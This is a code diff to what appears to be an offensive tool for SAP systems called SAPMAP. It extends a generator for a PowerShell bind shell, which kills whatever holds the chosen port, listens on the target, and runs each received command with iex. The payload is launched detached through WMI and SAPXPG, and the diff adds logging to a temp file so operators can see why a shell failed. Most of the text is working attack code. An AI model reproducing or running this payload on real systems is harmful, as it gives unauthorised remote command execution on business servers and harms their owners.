@@ -1880,25 +1880,44 @@ def _generate_bind_payload(os_type: str, port: int,
         # exist).  netstat -ano + taskkill is universal since XP.
         # Each block wrapped in try/catch with -EA 0 so a first-run
         # target (nothing to kill) doesn't blow the pipeline.
+        #
+        # Diagnostic markers: the payload runs detached via WMI so
+        # PowerShell errors don't come back through SXPG's stdout.
+        # Every stage writes to %TEMP%\sapmap_bind.log so operators
+        # can inspect what actually happened when the shell doesn't
+        # come up.  Read the file back with GW SAPXPG /bin/cat or
+        # PowerShell gc if the bind fails silently.
+        log_path = r"$env:TEMP\sapmap_bind.log"
         ps = (f"# SAPMAP-MODE: BIND port={port}\n"
+              f"$__L='{log_path}';"
+              f"$__W={{param($m);try{{Add-Content -Path $__L "
+              f"-Value ((Get-Date -Format 'HH:mm:ss.fff')+' '+$m) "
+              f"-EA 0}}catch{{}}}};"
+              f"&$__W 'START bind port={port} pid='+$PID;"
               f"try{{Get-NetTCPConnection -LocalPort {port} -EA 0|"
-              f"%{{try{{Stop-Process -Id $_.OwningProcess -Force -EA 0}}"
-              f"catch{{}}}}}}catch{{}};"
+              f"%{{try{{Stop-Process -Id $_.OwningProcess -Force -EA 0;"
+              f"&$__W ('killed via NetTCP pid='+$_.OwningProcess)}}"
+              f"catch{{}}}}}}catch{{&$__W 'no Get-NetTCPConnection (PS 2.0)'}};"
               f"try{{$lines=netstat -ano|Select-String ':{port} ' -EA 0;"
               f"foreach($ln in $lines){{if($ln -match '(\\d+)\\s*$')"
-              f"{{try{{taskkill /F /PID $matches[1] 2>$null|Out-Null}}"
-              f"catch{{}}}}}}}}catch{{}};"
+              f"{{try{{taskkill /F /PID $matches[1] 2>$null|Out-Null;"
+              f"&$__W ('killed via netstat pid='+$matches[1])}}"
+              f"catch{{}}}}}}}}catch{{&$__W 'netstat cleanup errored'}};"
               f"Start-Sleep -Milliseconds 1000;"
-              f"$l=New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any,{port});"
-              f"$l.Start();"
+              f"try{{$l=New-Object Net.Sockets.TcpListener("
+              f"[Net.IPAddress]::Any,{port});$l.Start();"
+              f"&$__W 'bind OK, waiting for connection'}}"
+              f"catch{{&$__W ('BIND FAILED: '+$_.Exception.Message);exit 1}};"
               f"$c=$l.AcceptTcpClient();"
+              f"&$__W 'client connected';"
               f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
               f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
               f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
               f"$r=(iex $d 2>&1|Out-String);"
               f"$p=$r+'PS '+$(pwd).Path+'> ';"
               f"$t=([text.encoding]::ASCII).GetBytes($p);"
-              f"$s.Write($t,0,$t.Length);$s.Flush()}};$c.Close();$l.Stop()")
+              f"$s.Write($t,0,$t.Length);$s.Flush()}};$c.Close();$l.Stop();"
+              f"&$__W 'session closed'")
         return _win_multistep_payload(ps, f"PowerShell bind shell on port {port}")
     else:
         # Bind shell: listen on target, SAPMAP connects to it.
@@ -13867,7 +13886,14 @@ def create_app(api: SAPMAPApi) -> Bottle:
             if result.get("success"):
                 print(f"[+] {sid}: Shell payload delivered")
                 if result.get("output"):
-                    for line in result["output"][:5]:
+                    # Print more lines when the payload uses the WMI
+                    # detach — Win32_Process.Create's return dumps
+                    # __GENUS/__CLASS/... metadata for a dozen lines
+                    # BEFORE the crucial ProcessId + ReturnValue that
+                    # tell us whether the spawn worked.  A truncation
+                    # at 5 lines hid the real signal (Return=0 = OK,
+                    # anything else = failure) on Windows targets.
+                    for line in result["output"][:20]:
                         print(f"    {line}")
                 # For bind mode: check for a listener-side failure BEFORE
                 # trying to connect.  Otherwise we can end up talking to
